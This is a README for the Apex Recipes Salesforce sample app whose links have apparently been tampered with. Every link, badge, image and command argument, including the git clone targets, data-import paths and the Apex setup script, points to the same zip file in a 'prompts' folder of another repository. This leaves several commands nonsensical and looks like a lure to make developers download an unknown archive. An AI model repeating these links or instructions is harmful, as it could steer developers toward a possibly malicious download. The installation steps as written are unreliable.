# Apex Recipes

[![Github Workflow](<https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip%20DX%20(scratch%20org)https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip>)](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip%3A%22Salesforce+DX+%28scratch+org%29%22) [![Packaging](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip)](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip%3A%22Packaging%22) [![codecov](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip)](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip)

## Introduction

Apex Recipes is a library of concise, meaningful examples of code for common use cases utilizing best practices. They reflect enterprise patterns that can be utilized
for real world solutions and should relevant to developers of all skill levels. The code is intended to reflect clarity while trying to maintain brevity. See the Table of Contents for installation options. We recommend using the [Salesforce CLI](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) and a scratch org for your initial deployment.

<div>
   <img src="https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip,fl_lossy,https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip" align="left" alt="Trailhead Badge" height="40px" width="40px"/>
   <p>Learn more about this app by completing the <a href="https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip">Quick Start: Explore the Apex Recipes Sample App</a> Trailhead project.</p>
</div>

## Table of contents

-   [Installing Apex Recipes Using a Scratch Org](#installing-the-app-using-a-scratch-org): This is the recommended installation option. Use this option if you are a developer who wants to experience the app and the code.

-   [Installing Apex Recipes Using an Unlocked Package](#installing-the-app-using-an-unlocked-package): This option allows anybody to experience the sample app without installing a local development environment.

-   [Installing Apex Recipes using a Developer Edition Org or a Trailhead Playground via the Salesforce CLI](#installing-the-app-using-a-developer-edition-org-or-a-trailhead-playground): Useful when tackling Trailhead Badges or if you want the app deployed to a more permanent environment than a Scratch org.

-   [Optional installation instructions](#optional-installation-instructions)

## Installing the app using a Scratch Org

1. Set up your environment. Follow the steps in the [Quick Start: Lightning Web Components](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) Trailhead project. The steps include:

    - Enable Dev Hub in your Trailhead Playground
    - Install Salesforce CLI
    - Install Visual Studio Code
    - Install the Visual Studio Code Salesforce extensions

1. If you haven't already done so, authorize with your hub org and provide it with an alias (**myhuborg** in the command below):

    ```
    sfdx force:auth:web:login -d -a myhuborg
    ```

1. Clone the apex-recipes repository:

    ```
    git clone https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    cd apex-recipes
    ```

1. Create a scratch org and provide it with an alias (**apex-recipes** in the command below):

    ```
    sfdx force:org:create -s -f https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip -a apex-recipes
    ```

1. Push the app to your scratch org:

    ```
    sfdx force:source:push
    ```

1. Assign the **Apex_Recipes** permission set to the default user:

    ```
    sfdx force:user:permset:assign -n Apex_Recipes
    ```

1. Assign the **Walkthroughs** permission set to the default user:

    ```
    sfdx force:user:permset:assign -n Walkthroughs
    ```

1. Import Sample Data

    ```
    sfdx force:data:tree:import -p https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    sfdx force:data:tree:import -p https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    ```

1. Execute the Anonymous Apex setup script

    ```
    sfdx force:apex:execute --apexcodefile https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    ```

1. Open the scratch org:

    ```
    sfdx force:org:open
    ```

1. In App Launcher, select the **Apex Recipes** app.

## Installing the app using an Unlocked Package

Follow this set of instructions if you want to deploy the app to a more permanent environment than a Scratch org or if you don't want to install the local developement tools. You can use a non source-tracked orgs such as a free [Developer Edition Org](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) or a [Trailhead Playground](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip).

Make sure to start from a **brand-new environment** to avoid conflicts with previous work you may have done.

1. Log in to your org

1. If you are setting up a Developer Edition: go to **Setup**, under **My Domain**, [register a My Domain](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip).

    - Please be sure that the domain is both **registered** and **deployed** and that your user has logged into the new domain.

1. Go to **Setup**, under **Platform Cache**, and click the "Request Trial Capacity" button. [Request a Platform Cache Trial](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip)

1. Click [this link](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) to install the Apex Recipes unlocked package in your org.

1. Select **Install for All Users**

1. Once installed:

1. (Optional) Add additional data examples. [In the data folder](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) are sample CSV files which can be
   used by https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip or the Import Data Wizard.

1. (Optional) Load the sample Junction objects data:

    - Click the **Setup Gear Icon**
    - Click **Developer Console**
    - Click **Debug**
    - Click **Open Execute Anonymous Window**
    - Enter: `https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip();`
    - Click **Execute**

1. Add the Apex Recipes permission set to your user:

    - Go to **Setup > Users > Permission Sets**.
    - Click **Apex_Recipes**.
    - Click **Manage Assignments**.
    - Check your user and click **Add Assignments**.

1. In App Launcher, select the **Apex Recipes** app.
    - If the app does not load, please double check that My Domain is **registered** and **deployed** and that the **Apex Recipes** permission set active on your user.

## Installing the App using a Developer Edition Org or a Trailhead Playground via the Salesforce CLI

Follow this set of instructions if you want to deploy the app to a more permanent environment than a Scratch org.
This includes non source-tracked orgs such as a [free Developer Edition Org](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) or a [Trailhead Playground](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip).

Make sure to start from a brand-new environment to avoid conflicts with previous work you may have done.

1. Clone this repository:

    ```
    git clone https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    cd apex-recipes
    ```

1. Authorize with your Trailhead Playground or Developer Edition org and provide it with an alias (**mydevorg** in the command below):

    ```
    sfdx force:auth:web:login -s -a mydevorg
    ```

1. If you are setting up a Developer Edition: go to **Setup**, under **My Domain**, [register a My Domain](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip).

1. If you are setting up a Developer Edition: go to **Setup**, under **Platform Cache**, and click the "Request Trial Capacity" button. [Request a Platform Cache Trial](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip)

1. Run this command in a terminal to deploy the app.

    ```
    sfdx force:source:deploy -p force-app
    ```

1. Assign the `Apex_Recipes` permission set to the default user.

    ```
    sfdx force:user:permset:assign -n Apex_Recipes
    ```

1. Import Sample Data

    ```
    sfdx force:data:tree:import -p https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    sfdx force:data:tree:import -p https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    ```

1. Execute the Anonymous Apex setup script

    ```
    sfdx force:apex:execute --apexcodefile https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip
    ```

1. If your org isn't already open, open it now:

    ```
    sfdx force:org:open -u mydevorg
    ```

1. In App Launcher, select the **Apex Recipes** app.
    - If the app does not load, please double check that My Domain is **registered** and **deployed** and that the **Apex Recipes** permission set active on your user.

## Optional Installation Instructions

This repository contains several files that are relevant if you want to integrate modern web development tooling to your Salesforce development processes, or to your continuous integration/continuous deployment processes.

### Code formatting

[Prettier](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) is a code formatter used to ensure consistent formatting across your code base. To use Prettier with Visual Studio Code, install [this extension](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) from the Visual Studio Code Marketplace. The [.prettierignore](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) and [.prettierrc](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) files are provided as part of this repository to control the behavior of the Prettier formatter.

### Code linting

[ESLint](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) is a popular JavaScript linting tool used to identify stylistic errors and erroneous constructs. To use ESLint with Visual Studio Code, install [this extension](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) from the Visual Studio Code Marketplace. The [.eslintignore](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) file is provided as part of this repository to exclude specific files from the linting process in the context of Lighning Web Components development.

### Apex Docs

[ApexDocs](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) is a NPM package for generating Markdown (.md) files from the Classes in this repository. The https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip file in
this repo includes an npm script for generating these Apex docs. Execute `npm run apexdocs` to generate fresh docs. These docs are shipped as part of a Static Resource and are available in your org via the Apex Recipes app. Navigate to any class and click it's coresponding Docs tab.

### Pre-commit hook

This repository also comes with a [https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) file that makes it easy to set up a pre-commit hook that enforces code formatting and linting by running Prettier and ESLint every time you `git commit` changes.

To set up the formatting and linting pre-commit hook:

1. Install [https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) if you haven't already done so
1. Run `npm install` in your project's root folder to install the ESLint and Prettier modules (Note: Mac users should verify that Xcode command line tools are installed before running this command.)

> Note: This projects also contains [Jest](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) tests for unit testing Lightning Web Components. If you experience errors regarding `deasync` when running `npm install` please check out the troubleshooting information in the [lwc-jest repository](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip).

Prettier and ESLint will now run automatically every time you commit changes. The commit will fail if linting errors are detected. You can also run the formatting and linting from the command line using the following commands (check out [https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip](https://raw.githubusercontent.com/dkadam77/apex-recipes/master/force-app/main/default/prompts/apex-recipes_2.3-beta.2.zip) for the full list):

```
npm run lint:lwc
npm run prettier
```
